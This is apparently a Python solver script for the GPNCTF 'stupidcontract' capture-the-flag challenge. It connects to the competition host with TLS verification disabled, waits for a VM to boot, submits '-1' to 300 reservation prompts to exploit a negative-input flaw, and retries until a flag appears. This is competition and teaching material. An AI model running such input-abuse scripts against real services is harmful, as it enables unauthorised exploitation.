#!/usr/bin/env python3
"""
Solver for GPNCTF stupidcontract - Remote version with proper VM boot wait.

The QEMU VM takes significant time to boot. We must wait for the actual
challenge prompt before sending input.

Strategy: 
  1. Wait for VM boot + challenge prompt
  2. Send -1 for each of the 300 attempts
  3. Check for flag
  4. Retry on new connections if needed
"""
import re
import socket
import ssl
import sys
import time

HOST = "charred-crab-over-braised-harissa-83m8.gpn24.ctf.kitctf.de"
PORT = 443
USE_SSL = True
MAX_RETRIES = 15

FLAG_RE = re.compile(rb"GPNCTF\{[^\}\r\n]+\}")
PROMPT_RE = re.compile(rb"For which restaurant do you want a reservation")
BOOT_TIMEOUT = 120   # Wait up to 2 minutes for VM to boot
RESP_TIMEOUT = 5     # Wait up to 5 seconds for each response


def recv_until_pattern(sock, pattern: re.Pattern, timeout: float) -> tuple[bytes, bool]:
    """Receive data until pattern is found or timeout. Returns (data, found)."""
    end = time.time() + timeout
    data = bytearray()
    sock.setblocking(False)
    found = False
    try:
        while time.time() < end:
            try:
                chunk = sock.recv(8192)
                if chunk:
                    data += chunk
                    if pattern.search(data):
                        found = True
                        break
                else:
                    break  # Connection closed
            except (BlockingIOError, ssl.SSLWantReadError):
                time.sleep(0.05)
    finally:
        sock.setblocking(True)
    return bytes(data), found


def recv_for(sock, timeout: float) -> bytes:
    """Receive whatever is available for timeout seconds."""
    end = time.time() + timeout
    data = bytearray()
    sock.setblocking(False)
    try:
        while time.time() < end:
            try:
                chunk = sock.recv(8192)
                if chunk:
                    data += chunk
                else:
                    break
            except (BlockingIOError, ssl.SSLWantReadError):
                time.sleep(0.05)
    finally:
        sock.setblocking(True)
    return bytes(data)


def connect():
    raw = socket.create_connection((HOST, PORT), timeout=30)
    if not USE_SSL:
        return raw
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(raw, server_hostname=HOST)


def try_once(attempt_num: int) -> str | None:
    """Make one connection attempt. Returns flag string or None."""
    print(f"\n{'='*60}")
    print(f"[*] Connection attempt {attempt_num}")
    print(f"{'='*60}")
    
    try:
        s = connect()
        print(f"    Connected to {HOST}:{PORT}")
    except Exception as e:
        print(f"    Connection failed: {e}")
        return None

    try:
        # Phase 1: Wait for VM to boot and challenge to start
        print(f"    Waiting for VM boot and challenge prompt (up to {BOOT_TIMEOUT}s)...")
        data, found = recv_until_pattern(s, PROMPT_RE, BOOT_TIMEOUT)
        
        if not found:
            print(f"    Timeout waiting for challenge prompt")
            tail = data[-200:].decode(errors='replace') if data else "(empty)"
            print(f"    Last output: {tail}")
            return None
        
        print(f"    Challenge prompt detected! Starting exploit...")
        
        # Phase 2: Send -1 for each prompt
        all_data = bytearray(data)
        
        for i in range(300):
            s.sendall(b"-1\n")
            
            # Wait for next prompt or final result
            if i < 299:
                resp, _ = recv_until_pattern(s, PROMPT_RE, RESP_TIMEOUT)
                all_data += resp
            else:
                # Last attempt - wait longer for final result
                resp = recv_for(s, 15.0)
                all_data += resp
            
            # Check for flag at any point
            m = FLAG_RE.search(all_data)
            if m:
                return m.group(0).decode()
            
            # Progress indicator
            if (i + 1) % 50 == 0:
                print(f"    Sent {i+1}/300 attempts...")

        # Phase 3: Wait for final output (validate_reservations + result)
        print(f"    All 300 inputs sent. Waiting for final result...")
        final = recv_for(s, 30.0)
        all_data += final
        
        m = FLAG_RE.search(all_data)
        if m:
            return m.group(0).decode()
        
        # Check what happened
        all_bytes = bytes(all_data)
        if b"Sorry" in all_bytes:
            print(f"    [-] No luck this time (DATA[0] was 0 after last attempt)")
        elif b"reservations to every" in all_bytes or b"Thank you" in all_bytes:
            print(f"    [?] Got success message but flag not captured!")
            # Try reading more
            extra = recv_for(s, 10.0)
            all_data += extra
            m = FLAG_RE.search(all_data)
            if m:
                return m.group(0).decode()
            print(f"    Tail: {bytes(all_data[-500:]).decode(errors='replace')}")
        else:
            print(f"    [?] Unexpected ending")
            print(f"    Tail: {bytes(all_data[-500:]).decode(errors='replace')}")

    except Exception as e:
        print(f"    Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            s.close()
        except:
            pass

    return None


def main() -> int:
    print(f"[*] Target: {HOST}:{PORT} (SSL={USE_SSL})")
    print(f"[*] Strategy: wait for boot, send -1 x300, retry")
    print(f"[*] Each connection has ~20% success probability")
    print(f"[*] Expected to succeed within ~5 connections")

    for i in range(1, MAX_RETRIES + 1):
        flag = try_once(i)
        if flag:
            print(f"\n{'='*60}")
            print(f"[+] FLAG: {flag}")
            print(f"[+] Found on attempt {i}")
            print(f"{'='*60}")
            return 0
        # Delay between connections to not overwhelm the server
        if i < MAX_RETRIES:
            print(f"\n    Waiting 5s before next attempt...")
            time.sleep(5)

    print(f"\n[!] Failed after {MAX_RETRIES} attempts", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
